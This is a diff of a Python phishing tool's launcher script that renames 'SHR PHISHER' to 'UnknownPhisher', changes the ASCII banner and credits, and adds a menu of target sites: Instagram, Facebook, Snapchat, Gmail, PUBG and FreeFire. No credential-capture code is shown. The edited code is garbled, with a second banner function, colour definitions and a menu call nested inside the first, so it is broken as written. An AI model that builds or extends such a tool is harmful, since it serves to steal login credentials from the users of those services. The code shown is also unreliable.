@@ -10,16 +10,42 @@ white = "\033[1;37m"
 yellow = "\033[1;33m"
 
 def banner():
+
+    import os
+
+# Define colors
+red = "\033[1;31m"
+yellow = "\033[1;33m"
+white = "\033[1;37m"
+green = "\033[1;32m"
+reset = "\033[0m"
+
+def banner():
     os.system('clear')
     print(f"{red}")
-    # Big Banner for SHR PHISHER
-    print("  ____  _   _ ____      ____  _   _ ___ ____  _   _ _____ ____  ")
-    print(" / ___|| | | |  _ \    |  _ \| | | |_ _/ ___|| | | | ____|  _ \ ")
-    print(" \___ \| |_| | |_) |   | |_) | |_| || |\___ \| |_| |  _| | |_) |")
-    print("  ___) |  _  |  _ <    |  _ <|  _  || | ___) |  _  | |___|  _ < ")
-    print(" |____/|_| |_|_| \_\   |_| \_\_| |_|___|____/|_| |_|_____|_| \_\\")
+    print("  _   _ _   _ _  _ _  _  _____ _  _ _  _ ")
+    print(" | | | | \ | | |/ / \ | |/ _ \ \ \ | | \ | |")
+    print(" | |_| |  \| | ' /|  \| | | | |\ \ | |  \| |")
+    print("  \___/|_|\__|_|\_\|_|\_|\___/  \_\|_|_|\__|")
+    print(f"{yellow}         >> UnknownPhisher v1.0 <<")
+    print(f"{white}         [ Created by: Kohabdull ]")
+    print(f"{green}         [ Team: The Unknowns   ]")
+    print(f"{white}==========================================")
+
+def menu():
+    banner()
+    print(f"\n{green}[01]{white} Instagram")
+    print(f"{green}[02]{white} Facebook")
+    print(f"{green}[03]{white} Snapchat")
+    print(f"{green}[04]{white} Gmail")
+    print(f"{green}[05]{white} PUBG")
+    print(f"{green}[06]{white} FreeFire")
+
+# To run the tool
+menu()
+
     print(f"{yellow}")
-    print("               >> SHR-PHISHER v1.0 <<")
+    print("               >> UnknownPhisher v1.0 <<")
     print(f"{white}              [ Created by Mr Unknown ]")
     print(f"{green}               [ Team:  The Unknown ]")
     print(f"{white}================================================================")
